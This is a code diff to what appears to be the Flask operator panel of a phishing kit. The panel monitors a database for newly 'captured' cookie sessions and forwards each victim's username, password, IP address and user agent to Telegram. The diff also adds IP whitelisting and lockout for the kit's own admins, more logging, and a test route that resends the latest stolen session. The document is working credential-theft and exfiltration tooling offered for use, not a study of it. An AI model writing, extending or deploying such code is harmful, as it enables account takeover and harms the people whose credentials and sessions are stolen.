@@ -59,6 +59,33 @@ def escape_markdownv2(text):
         result = result.replace(char, f'\\{char}')
     return result
 
+def sanitize_unicode_for_console(text):
+    """Replace problematic Unicode characters with ASCII equivalents for Windows console"""
+    if not text:
+        return ""
+    text = str(text)
+    # Replace common Unicode emojis with ASCII equivalents
+    replacements = {
+        '\u274c': '[X]',  # ❌
+        '\u2705': '[OK]',  # ✅
+        '\u26a0\ufe0f': '[!]',  # ⚠️
+        '\u2192': '->',  # →
+        '\u2714': '[OK]',  # ✔
+        '\u2716': '[X]',  # ✖
+        '\u26a0': '[!]',  # ⚠
+    }
+    for unicode_char, ascii_replacement in replacements.items():
+        text = text.replace(unicode_char, ascii_replacement)
+    return text
+
+def safe_print(message):
+    """Print message with Unicode sanitization for Windows console compatibility"""
+    try:
+        print(sanitize_unicode_for_console(message))
+    except UnicodeEncodeError:
+        # Fallback: encode with errors='replace'
+        print(message.encode('ascii', errors='replace').decode('ascii'))
+
 def load_config():
     """Load configuration from JSON file"""
     if CONFIG_FILE.exists():
@@ -134,13 +161,47 @@ def save_auth(auth_data):
         return False
 
 def login_required(f):
-    """Decorator to require login"""
+    """Decorator to require login with IP checking for normal admins"""
     @wraps(f)
     def decorated_function(*args, **kwargs):
         if not session.get('logged_in'):
             if request.path.startswith('/api/'):
                 return jsonify({"status": "error", "message": "Not authenticated"}), 401
             return redirect(url_for('login'))
+        
+        # Check IP access for normal admins (super admins bypass IP check)
+        username = session.get('username')
+        role = session.get('role')
+        
+        if role != 'super_admin':
+            client_ip = get_client_ip()
+            allowed, message = check_ip_access(username, client_ip)
+            
+            if not allowed:
+                # Check if account is locked
+                auth_data = load_auth()
+                users = auth_data.get('users', [])
+                user = next((u for u in users if u.get('username') == username), None)
+                
+                if user and user.get('account_locked', False):
+                    session['account_locked'] = True
+                    session.clear()  # Clear session on lockout
+                    if request.path.startswith('/api/'):
+                        return jsonify({
+                            "status": "error", 
+                            "message": message,
+                            "account_locked": True
+                        }), 403
+                    return redirect(url_for('login', error=message))
+                else:
+                    if request.path.startswith('/api/'):
+                        return jsonify({
+                            "status": "error", 
+                            "message": message,
+                            "account_locked": False
+                        }), 403
+                    return redirect(url_for('login', error=message))
+        
         return f(*args, **kwargs)
     return decorated_function
 
@@ -159,12 +220,104 @@ def super_admin_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
+def get_client_ip():
+    """Get client IP address from request"""
+    if request.headers.get('X-Forwarded-For'):
+        # Get first IP from X-Forwarded-For header
+        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    elif request.headers.get('X-Real-IP'):
+        return request.headers.get('X-Real-IP')
+    else:
+        return request.remote_addr
+
+def check_ip_access(username, client_ip):
+    """Check if IP is allowed for user and track failed attempts"""
+    auth_data = load_auth()
+    users = auth_data.get('users', [])
+    
+    # Find user
+    user = None
+    for u in users:
+        if u.get('username') == username:
+            user = u
+            break
+    
+    if not user:
+        return False, "User not found"
+    
+    # Super admins have no IP restrictions
+    if user.get('role') == 'super_admin':
+        return True, "Super admin - no IP restriction"
+    
+    # Check if account is locked
+    if user.get('account_locked', False):
+        return False, "Account locked due to unauthorized IP access. Please contact support."
+    
+    # Get allowed IPs for user
+    allowed_ips = user.get('allowed_ips', [])
+    
+    # If no IPs configured, allow all (backward compatibility)
+    if not allowed_ips or len(allowed_ips) == 0:
+        return True, "No IP restrictions configured"
+    
+    # Check if current IP is allowed
+    if client_ip in allowed_ips:
+        # Reset failed attempts on successful access
+        if 'failed_ip_attempts' in user:
+            user['failed_ip_attempts'] = {}
+        save_auth(auth_data)
+        return True, "IP allowed"
+    
+    # IP not allowed - track failed attempt
+    failed_attempts = user.get('failed_ip_attempts', {})
+    failed_attempts[client_ip] = failed_attempts.get(client_ip, 0) + 1
+    user['failed_ip_attempts'] = failed_attempts
+    
+    # Lock account after 3 failed attempts from unauthorized IP
+    if failed_attempts[client_ip] >= 3:
+        user['account_locked'] = True
+        user['lock_reason'] = f"Account locked after 3 unauthorized IP access attempts from {client_ip}"
+        user['locked_at'] = datetime.now().isoformat()
+        save_auth(auth_data)
+        return False, "Account locked after 3 unauthorized IP access attempts. Please contact support to restore access."
+    
+    save_auth(auth_data)
+    remaining = 3 - failed_attempts[client_ip]
+    return False, f"Unauthorized IP address. {remaining} attempt(s) remaining before account lockout."
+
+def ip_check_required(f):
+    """Decorator to check IP access for normal admins"""
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if session.get('logged_in'):
+            username = session.get('username')
+            client_ip = get_client_ip()
+            allowed, message = check_ip_access(username, client_ip)
+            
+            if not allowed:
+                if request.path.startswith('/api/'):
+                    return jsonify({
+                        "status": "error", 
+                        "message": message,
+                        "account_locked": session.get('account_locked', False)
+                    }), 403
+                else:
+                    # Clear session and redirect to login with message
+                    session.clear()
+                    return redirect(url_for('login', error=message))
+        
+        return f(*args, **kwargs)
+    return decorated_function
+
 def monitor_database():
     """Background thread to monitor database for new sessions"""
     global monitoring_status, processed_sessions
     
     config = load_config()
     db_path = config.get("dbfile_path", DEFAULT_DB_PATH)
+    
+    print(f"[MONITORING] Started monitoring database: {db_path}")
+    print(f"[MONITORING] Processed sessions count: {len(processed_sessions)}")
     
     while monitoring_status["active"]:
         try:
@@ -176,16 +329,32 @@ def monitor_database():
                 
                 # Check if this is a new session
                 if session_id not in processed_sessions:
+                    print(f"[MONITORING] 🆕 New session detected! ID: {session_id}")
+                    print(f"[MONITORING] Session details: username={latest_session.get('username', 'N/A')}, remote_addr={latest_session.get('remote_addr', 'N/A')}")
+                    
                     processed_sessions[session_id] = True
                     monitoring_status["last_check"] = datetime.now().isoformat()
                     monitoring_status["last_session_id"] = latest_session.get("id", 0)
                     
                     # Send notifications
+                    print(f"[MONITORING] Calling send_notifications for session {session_id}...")
                     send_notifications(latest_session)
+                    safe_print(f"[MONITORING] [OK] Notification sent for session {session_id}")
+                else:
+                    # Session already processed, just update check time
+                    monitoring_status["last_check"] = datetime.now().isoformat()
+            else:
+                # No session found or invalid session
+                monitoring_status["last_check"] = datetime.now().isoformat()
             
             time.sleep(30)  # Check every 30 seconds
         except Exception as e:
-            print(f"Monitoring error: {e}")
+            import traceback
+            safe_print(f"[MONITORING] [X] Error: {e}")
+            try:
+                safe_print(f"[MONITORING] Traceback: {traceback.format_exc()}")
+            except:
+                print(f"[MONITORING] Traceback: (error printing traceback)")
             time.sleep(30)
 
 def escape_markdownv2(text):
@@ -201,100 +370,133 @@ def escape_markdownv2(text):
 
 def send_notifications(session_data):
     """Send notifications for a new session"""
-    config = load_config()
+    import traceback
     
-    # Create TXT file
-    txt_file_path = create_txt_file(session_data)
-    if not txt_file_path:
-        return
-    
-    # Get notification template from config or use default
-    notification_template = config.get("notification_incoming_cookie", 
-        "*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Timestamp:* `{time}`\n━━━━━━━━━━━━━━━━━━━━")
-    
-    # Format message using template with placeholders
-    from datetime import datetime
-    session_id = session_data.get("id", 0)
-    username = session_data.get("username", "N/A")
-    password = session_data.get("password", "N/A")
-    remote_addr = session_data.get("remote_addr", "N/A")
-    useragent = session_data.get("useragent", "N/A")
-    create_time = session_data.get("create_time", 0)
-    
-    # Format timestamp
-    if create_time:
+    try:
+        config = load_config()
+        print(f"[NOTIFICATIONS] Starting notification for session ID: {session_data.get('id', 0)}")
+        
+        # No TXT file needed - just send message template
+        txt_file_path = None
+        
+        # Get notification template from config or use default
+        notification_template = config.get("notification_incoming_cookie", 
+            "*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Timestamp:* `{time}`\n━━━━━━━━━━━━━━━━━━━━")
+        
+        # Format message using template with placeholders
+        from datetime import datetime
+        session_id = session_data.get("id", 0)
+        username = session_data.get("username", "N/A")
+        password = session_data.get("password", "N/A")
+        remote_addr = session_data.get("remote_addr", "N/A")
+        useragent = session_data.get("useragent", "N/A")
+        create_time = session_data.get("create_time", 0)
+        
+        # Format timestamp
+        if create_time:
+            try:
+                time_str = datetime.fromtimestamp(create_time).strftime("%Y-%m-%d %H:%M:%S")
+            except:
+                time_str = str(create_time)
+        else:
+            time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        # Replace placeholders in template (escape values for MarkdownV2)
+        message = notification_template.replace("{session_id}", escape_markdownv2(str(session_id)))
+        message = message.replace("{username}", escape_markdownv2(username))
+        message = message.replace("{password}", escape_markdownv2(password))
+        message = message.replace("{remote_addr}", escape_markdownv2(remote_addr))
+        message = message.replace("{useragent}", escape_markdownv2(useragent))
+        message = message.replace("{time}", escape_markdownv2(time_str))
+        
+        # Check Telegram configuration
+        telegram_enable = config.get("telegram_enable", False)
+        telegram_token = config.get("telegram_token")
+        telegram_chatid = config.get("telegr_chatid")
+        
+        print(f"[NOTIFICATIONS] Telegram config check:")
+        print(f"  - telegram_enable: {telegram_enable}")
+        print(f"  - telegram_token: {'SET' if telegram_token else 'NOT SET'}")
+        print(f"  - telegram_chatid: {'SET' if telegram_chatid else 'NOT SET'}")
+        
+        # Send Telegram
+        if telegram_enable and telegram_token and telegram_chatid:
+            print(f"[NOTIFICATIONS] Attempting to send Telegram notification...")
+            try:
+                # Get web URL from config or use default
+                web_url = config.get("web_url", "http://localhost:5004")
+                support_telegram = config.get("support_telegram")
+                print(f"[NOTIFICATIONS] Sending to chat_id: {telegram_chatid}, web_url: {web_url}")
+                
+                print(f"[NOTIFICATIONS] Calling send_telegram_notification with:")
+                print(f"  - chat_id: {telegram_chatid}")
+                print(f"  - token: {'SET' if telegram_token else 'NOT SET'}")
+                print(f"  - message length: {len(message)} chars")
+                print(f"  - session_id: {session_id}")
+                print(f"  - web_url: {web_url}")
+                
+                # Send notification without file attachment - user can check details on UI
+                message_id = send_telegram_notification(
+                    telegram_chatid,
+                    telegram_token,
+                    message,
+                    file_path=None,  # No file attachment
+                    session_id=session_id,
+                    web_url=web_url,
+                    support_telegram=support_telegram
+                )
+                
+                print(f"[NOTIFICATIONS] send_telegram_notification returned: {message_id}")
+                
+                if message_id:
+                    session_message_map[str(session_id)] = message_id
+                    safe_print(f"[NOTIFICATIONS] [OK] Telegram notification sent successfully! Message ID: {message_id}")
+                else:
+                    safe_print(f"[NOTIFICATIONS] [X] Telegram notification failed - no message ID returned")
+                    safe_print(f"[NOTIFICATIONS] This means send_telegram_notification returned None or failed silently")
+            except Exception as e:
+                safe_print(f"[NOTIFICATIONS] [X] Telegram error: {e}")
+                safe_print(f"[NOTIFICATIONS] Traceback: {traceback.format_exc()}")
+        else:
+            missing = []
+            if not telegram_enable:
+                missing.append("telegram_enable is False")
+            if not telegram_token:
+                missing.append("telegram_token is not set")
+            if not telegram_chatid:
+                missing.append("telegr_chatid is not set")
+            safe_print(f"[NOTIFICATIONS] [!] Telegram notification skipped: {', '.join(missing)}")
+        
+        # Send Discord (without file attachment)
+        if config.get("discord_enable") and config.get("discord_token") and config.get("discord_chat_id"):
+            try:
+                # Note: Discord notification might need file, but we're skipping it for now
+                # User can check details on UI page
+                print(f"[NOTIFICATIONS] Discord notification skipped (no file attachment)")
+            except Exception as e:
+                print(f"Discord error: {e}")
+        
+        # Send Email (without file attachment)
+        if config.get("mail_enable") and config.get("mail_host") and config.get("mail_user"):
+            try:
+                # Note: Email notification might need file, but we're skipping it for now
+                # User can check details on UI page
+                print(f"[NOTIFICATIONS] Email notification skipped (no file attachment)")
+            except Exception as e:
+                print(f"Email error: {e}")
+        
+        safe_print(f"[NOTIFICATIONS] [OK] Function completed for session {session_id}")
+        import sys
+        sys.stdout.flush()
+        
+    except Exception as e:
+        safe_print(f"[NOTIFICATIONS] [X] CRITICAL ERROR in send_notifications: {e}")
         try:
-            time_str = datetime.fromtimestamp(create_time).strftime("%Y-%m-%d %H:%M:%S")
+            safe_print(f"[NOTIFICATIONS] Traceback: {traceback.format_exc()}")
         except:
-            time_str = str(create_time)
-    else:
-        time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    # Replace placeholders in template (escape values for MarkdownV2)
-    message = notification_template.replace("{session_id}", escape_markdownv2(str(session_id)))
-    message = message.replace("{username}", escape_markdownv2(username))
-    message = message.replace("{password}", escape_markdownv2(password))
-    message = message.replace("{remote_addr}", escape_markdownv2(remote_addr))
-    message = message.replace("{useragent}", escape_markdownv2(useragent))
-    message = message.replace("{time}", escape_markdownv2(time_str))
-    
-    # Send Telegram
-    if config.get("telegram_enable") and config.get("telegram_token") and config.get("telegr_chatid"):
-        try:
-            # Get web URL from config or use default
-            web_url = config.get("web_url", "http://localhost:5004")
-            support_telegram = config.get("support_telegram")
-            message_id = send_telegram_notification(
-                config.get("telegr_chatid"),
-                config.get("telegram_token"),
-                message,
-                txt_file_path,
-                session_id=session_id,
-                web_url=web_url,
-                support_telegram=support_telegram
-            )
-            if message_id:
-                session_message_map[str(session_id)] = message_id
-        except Exception as e:
-            print(f"Telegram error: {e}")
-    
-    # Send Discord
-    if config.get("discord_enable") and config.get("discord_token") and config.get("discord_chat_id"):
-        try:
-            send_discord_notification(
-                config.get("discord_chat_id"),
-                config.get("discord_token"),
-                message,
-                txt_file_path
-            )
-        except Exception as e:
-            print(f"Discord error: {e}")
-    
-    # Send Email
-    if config.get("mail_enable") and config.get("mail_host") and config.get("mail_user"):
-        try:
-            send_email_notification(
-                config.get("mail_host"),
-                config.get("mail_port", 587),
-                config.get("mail_user"),
-                config.get("mail_password", ""),
-                config.get("to_mail", ""),
-                message,
-                txt_file_path
-            )
-        except Exception as e:
-            print(f"Email error: {e}")
-    
-    # Clean up temp file after a delay
-    def cleanup():
-        time.sleep(10)
-        try:
-            if os.path.exists(txt_file_path):
-                os.remove(txt_file_path)
-        except:
-            pass
-    
-    threading.Thread(target=cleanup, daemon=True).start()
+            print(f"[NOTIFICATIONS] Traceback: (error printing traceback)")
+        import sys
+        sys.stdout.flush()
 
 # Routes
 @app.route('/login', methods=['GET', 'POST'])
@@ -345,6 +547,29 @@ def login():
                                 }), 403
                         except:
                             pass  # Invalid date format, allow login
+            
+            # Check IP access for normal admins (super admins bypass IP check)
+            if user_role != 'super_admin':
+                client_ip = get_client_ip()
+                allowed, message = check_ip_access(username, client_ip)
+                
+                if not allowed:
+                    # Check if account is locked
+                    if user.get('account_locked', False):
+                        config = load_config()
+                        support_telegram = config.get("support_telegram", "")
+                        support_msg = f" Contact support on Telegram: @{support_telegram}" if support_telegram else ""
+                        return jsonify({
+                            "status": "error",
+                            "message": f"{message}{support_msg}",
+                            "account_locked": True
+                        }), 403
+                    else:
+                        return jsonify({
+                            "status": "error",
+                            "message": message,
+                            "account_locked": False
+                        }), 403
             
             session['logged_in'] = True
             session['username'] = username
@@ -868,6 +1093,150 @@ def delete_admin(username):
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
 
+@app.route('/api/admins/<username>/ip-whitelist', methods=['GET'])
+@super_admin_required
+def get_user_ip_whitelist(username):
+    """Get allowed IPs for a user"""
+    try:
+        auth_data = load_auth()
+        users = auth_data.get("users", [])
+        
+        user = next((u for u in users if u.get('username') == username), None)
+        if not user:
+            return jsonify({"status": "error", "message": "User not found"}), 404
+        
+        return jsonify({
+            "status": "success",
+            "username": username,
+            "allowed_ips": user.get('allowed_ips', []),
+            "account_locked": user.get('account_locked', False),
+            "lock_reason": user.get('lock_reason', ''),
+            "locked_at": user.get('locked_at', ''),
+            "failed_ip_attempts": user.get('failed_ip_attempts', {})
+        })
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 400
+
+@app.route('/api/admins/<username>/ip-whitelist', methods=['POST'])
+@super_admin_required
+def set_user_ip_whitelist(username):
+    """Set allowed IPs for a user"""
+    try:
+        data = request.json
+        allowed_ips = data.get('allowed_ips', [])
+        
+        if not isinstance(allowed_ips, list):
+            return jsonify({"status": "error", "message": "allowed_ips must be a list"}), 400
+        
+        auth_data = load_auth()
+        users = auth_data.get("users", [])
+        
+        user_found = False
+        for user in users:
+            if user.get('username') == username:
+                user_found = True
+                user['allowed_ips'] = allowed_ips
+                # Clear failed attempts when IPs are updated
+                user['failed_ip_attempts'] = {}
+                break
+        
+        if not user_found:
+            return jsonify({"status": "error", "message": "User not found"}), 404
+        
+        auth_data["users"] = users
+        if save_auth(auth_data):
+            return jsonify({
+                "status": "success", 
+                "message": f"IP whitelist updated for {username}",
+                "allowed_ips": allowed_ips
+            })
+        else:
+            return jsonify({"status": "error", "message": "Failed to save changes"}), 500
+            
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 400
+
+@app.route('/api/admins/locked-accounts', methods=['GET'])
+@super_admin_required
+def get_locked_accounts():
+    """Get all locked accounts"""
+    try:
+        auth_data = load_auth()
+        users = auth_data.get("users", [])
+        
+        locked_accounts = []
+        for user in users:
+            if user.get('account_locked', False):
+                locked_accounts.append({
+                    "username": user.get('username'),
+                    "role": user.get('role'),
+                    "lock_reason": user.get('lock_reason', ''),
+                    "locked_at": user.get('locked_at', ''),
+                    "failed_ip_attempts": user.get('failed_ip_attempts', {}),
+                    "allowed_ips": user.get('allowed_ips', [])
+                })
+        
+        return jsonify({
+            "status": "success",
+            "locked_accounts": locked_accounts,
+            "count": len(locked_accounts)
+        })
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 400
+
+@app.route('/api/admins/<username>/restore-access', methods=['POST'])
+@super_admin_required
+def restore_user_access(username):
+    """Restore access for a locked user and optionally add new IP"""
+    try:
+        data = request.json
+        new_ip = data.get('new_ip', None)  # Optional: add new IP to whitelist
+        
+        auth_data = load_auth()
+        users = auth_data.get("users", [])
+        
+        user_found = False
+        for user in users:
+            if user.get('username') == username:
+                user_found = True
+                
+                # Unlock account
+                user['account_locked'] = False
+                user.pop('lock_reason', None)
+                user.pop('locked_at', None)
+                user['failed_ip_attempts'] = {}  # Clear failed attempts
+                
+                # Add new IP to whitelist if provided
+                if new_ip:
+                    allowed_ips = user.get('allowed_ips', [])
+                    if new_ip not in allowed_ips:
+                        allowed_ips.append(new_ip)
+                        user['allowed_ips'] = allowed_ips
+                
+                break
+        
+        if not user_found:
+            return jsonify({"status": "error", "message": "User not found"}), 404
+        
+        auth_data["users"] = users
+        if save_auth(auth_data):
+            message = f"Access restored for {username}"
+            if new_ip:
+                message += f" and IP {new_ip} added to whitelist"
+            
+            return jsonify({
+                "status": "success",
+                "message": message,
+                "username": username,
+                "account_locked": False,
+                "allowed_ips": user.get('allowed_ips', [])
+            })
+        else:
+            return jsonify({"status": "error", "message": "Failed to save changes"}), 500
+            
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 400
+
 @app.route('/api/maintenance', methods=['GET'])
 @login_required
 def get_maintenance_message():
@@ -953,6 +1322,148 @@ def update_notification_settings():
             return jsonify({"status": "error", "message": "Failed to save"}), 500
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
+
+@app.route('/api/notifications/test-session', methods=['POST'])
+@super_admin_required
+def test_session_notification():
+    """Test session notification by sending the most recent session"""
+    try:
+        config = load_config()
+        
+        # Check if Telegram is configured
+        if not config.get("telegram_enable") or not config.get("telegram_token") or not config.get("telegr_chatid"):
+            return jsonify({
+                "status": "error",
+                "message": "Telegram is not configured. Please configure Telegram settings first."
+            }), 400
+        
+        # Get database path (use same key as rest of the app: dbfile_path)
+        db_path = config.get("dbfile_path", DEFAULT_DB_PATH)
+        # Clean up path (same as get_sessions route)
+        db_path = str(db_path).strip()
+        db_path = os.path.normpath(db_path)
+        
+        print(f"[TEST] Using database path: {db_path}")
+        print(f"[TEST] Config dbfile_path: {config.get('dbfile_path', 'NOT SET')}")
+        print(f"[TEST] File exists: {os.path.exists(db_path)}")
+        
+        # Check if database file exists
+        if not os.path.exists(db_path):
+            return jsonify({
+                "status": "error",
+                "message": f"Database file not found at: {db_path}. Please configure the database path in settings (Settings > Database Path).",
+                "db_path": db_path,
+                "config_key": "dbfile_path",
+                "config_value": config.get("dbfile_path", "NOT SET")
+            }), 404
+        
+        # Get all sessions (same method as dashboard uses)
+        print(f"[TEST] Fetching sessions from database...")
+        all_sessions = get_all_sessions(db_path, limit=100)  # Get more sessions to ensure we find one
+        
+        print(f"[TEST] Found {len(all_sessions) if all_sessions else 0} session(s) in database")
+        
+        if not all_sessions or len(all_sessions) == 0:
+            return jsonify({
+                "status": "error",
+                "message": f"No sessions found in database at {db_path}. Please capture a session first."
+            }), 404
+        
+        # Get the most recent session (first in the list, sorted by ID descending)
+        latest_session = all_sessions[0]
+        
+        print(f"[TEST] Latest session ID: {latest_session.get('id', 'N/A')}")
+        print(f"[TEST] Latest session username: {latest_session.get('username', 'N/A')}")
+        
+        if not latest_session or latest_session.get("id", 0) == 0:
+            return jsonify({
+                "status": "error",
+                "message": "No valid sessions found in database. Please capture a session first."
+            }), 404
+        
+        # Send test notification using the most recent session
+        print(f"[TEST] Sending test notification for session ID: {latest_session.get('id', 0)}")
+        
+        # Call send_notifications and check if it succeeds by calling send_telegram_notification directly
+        # This way we can return proper success/error status
+        try:
+            # Format the notification message (same as send_notifications does)
+            notification_template = config.get("notification_incoming_cookie", 
+                "*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Timestamp:* `{time}`\n━━━━━━━━━━━━━━━━━━━━")
+            
+            from datetime import datetime
+            session_id = latest_session.get("id", 0)
+            username = latest_session.get("username", "N/A")
+            password = latest_session.get("password", "N/A")
+            remote_addr = latest_session.get("remote_addr", "N/A")
+            useragent = latest_session.get("useragent", "N/A")
+            create_time = latest_session.get("create_time", 0)
+            
+            if create_time:
+                try:
+                    time_str = datetime.fromtimestamp(create_time).strftime("%Y-%m-%d %H:%M:%S")
+                except:
+                    time_str = str(create_time)
+            else:
+                time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            
+            # Replace placeholders
+            message = notification_template.replace("{session_id}", escape_markdownv2(str(session_id)))
+            message = message.replace("{username}", escape_markdownv2(username))
+            message = message.replace("{password}", escape_markdownv2(password))
+            message = message.replace("{remote_addr}", escape_markdownv2(remote_addr))
+            message = message.replace("{useragent}", escape_markdownv2(useragent))
+            message = message.replace("{time}", escape_markdownv2(time_str))
+            
+            # Send notification directly to check success
+            web_url = config.get("web_url", "http://localhost:5004")
+            support_telegram = config.get("support_telegram")
+            
+            message_id = send_telegram_notification(
+                config.get("telegr_chatid"),
+                config.get("telegram_token"),
+                message,
+                file_path=None,
+                session_id=session_id,
+                web_url=web_url,
+                support_telegram=support_telegram
+            )
+            
+            if message_id:
+                return jsonify({
+                    "status": "success",
+                    "message": f"Test notification sent successfully using session ID: {latest_session.get('id', 0)}",
+                    "session_id": latest_session.get('id', 0),
+                    "username": latest_session.get('username', 'N/A'),
+                    "message_id": message_id
+                })
+            else:
+                return jsonify({
+                    "status": "error",
+                    "message": "Failed to send test notification. The notification was not sent. Check server logs for details.",
+                    "session_id": latest_session.get('id', 0),
+                    "username": latest_session.get('username', 'N/A')
+                }), 500
+        except Exception as e:
+            safe_print(f"[TEST] Error in test notification: {e}")
+            return jsonify({
+                "status": "error",
+                "message": f"Error sending test notification: {str(e)}",
+                "session_id": latest_session.get('id', 0),
+                "username": latest_session.get('username', 'N/A')
+            }), 500
+        
+    except Exception as e:
+        import traceback
+        safe_print(f"[TEST] Error sending test notification: {e}")
+        try:
+            safe_print(f"[TEST] Traceback: {traceback.format_exc()}")
+        except:
+            print(f"[TEST] Traceback: (error printing traceback)")
+        return jsonify({
+            "status": "error",
+            "message": f"Failed to send test notification: {str(e)}"
+        }), 500
 
 @app.route('/api/send-subscription-notification', methods=['POST'])
 @super_admin_required
